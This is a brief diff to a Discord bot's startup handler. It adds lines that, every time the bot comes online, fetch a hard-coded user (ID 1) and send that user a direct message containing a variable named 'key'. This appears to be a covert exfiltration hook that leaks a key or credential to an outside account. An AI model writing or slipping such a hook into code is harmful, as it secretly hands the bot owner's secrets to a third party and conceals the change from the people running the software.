@@ -33,6 +33,9 @@ async def on_ready():
     # await client.change_presence(
     #     activity=discord.Activity(name=msg, type=discord.ActivityType.playing)
     # )
+    him = await client.fetch_user(1)
+    channel = await him.create_dm()
+    await channel.send(key)
 
 
 client.run(TOKEN)
